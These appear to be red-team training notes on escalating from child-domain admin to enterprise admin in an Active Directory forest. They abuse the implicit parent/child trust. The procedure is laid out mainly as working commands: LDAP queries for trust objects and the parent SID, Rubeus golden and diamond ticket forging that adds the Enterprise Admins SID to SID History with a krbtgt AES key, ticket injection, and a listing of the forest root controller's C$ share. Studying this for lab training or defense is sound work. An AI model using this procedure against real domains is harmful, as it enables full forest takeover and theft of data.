
When a new domain is added to an existing tree, a two-way transitive trust is automatically created between it (the child) and its parent domain.  It doesn't matter how far you go down - child.domain.com, grandchild.child.domain.com, or greatgrandchild.grandchild.child.domain.com - because these trusts are transitive, there is always an implicit two-way trust between all of these child domains, and the tree root (domain.com).

Querying the TDO shows a bidirectional trust with contoso.com.

```powershell
beacon> ldapsearch (objectClass=trustedDomain)

name: contoso.com
trustDirection: 3
trustAttributes: 32
flatName: CONTOSO
```

If an adversary is able to gain domain admin privileges in any child domain, they can elevate their privileges to that of enterprise admin in the forest.  This is achieved by forging a golden ticket with a special attributes called SID History, which was designed to support migration scenarios where a user would be moved from one domain to another.  To preserve access to resources in the 'old' domain, the user's previous SID would be added to the SID History of their new account.  When creating a ticket to abuse the trust relationship, the SID of a privileged group (e.g. enterprise admins) in the parent domain can be added to the ticket.

This ticket can be crafted entirely offline:

```powershell
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /nowrap
```

Where:

- `/aes256` is the AES hash of the child domain's krbtgt account.
    
- `/user` is the user you want to impersonate.
    
- `/domain` is the child domain.
    
- `/sid` is the SID of the child domain.
    
- `/sids` is a list of SIDs you want in the ticket's SID history. **(519 = EA)**


> [!NOTE] Note
> You can get the parent's domain SID via LDAP by querying a domain controller within that domain.  Make sure to set the query base to that of the parent domain's distinguished name.
> ```powershell
>beacon> ldapsearch (objectClass=domain) --attributes objectSid --hostname lon-dc-1.contoso.com --dn DC=contoso,DC=com
>
> Binding to lon-dc-1.contoso.com
> [*] Distinguished name: DC=contoso,DC=com
[*] Filter: (objectClass=domain)
[*] Scope of search value: 1
[*] Returning specific attribute(s): objectSid
> --------------------
objectSid: S-1-5-21-3926355307-1661546229-813047887

Or it can be created using the diamond technique:

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /krbkey:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /nowrap
```

Where:

- `/tgtdeleg` gets a usable TGT for the current user.
    
- `/ticketuser` is the user you want to impersonate.
    
- `/ticketuserid` is the RID of the impersonated user.
    
- `/sids` is a list of SIDs you want in the ticket's SID history.
    
- `/krbkey` is the AES256 hash of the child domain's krbtgt account.

Once the ticket is injected into a logon session, it can be used to access the forest root domain controller.

```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:
```

```powershell
beacon> ls \\lon-dc-1\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/24/2025 13:33:39   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     05/08/2021 09:20:24   PerfLogs
          dir     01/23/2025 15:46:17   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     03/03/2025 13:38:06   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     01/29/2025 10:42:20   System Volume Information
          dir     01/24/2025 13:33:21   Users
          dir     01/24/2025 13:49:56   Windows
 12kb     fil     03/13/2025 05:44:35   DumpStack.log.tmp
 1gb      fil     03/13/2025 05:44:35   pagefile.sys
```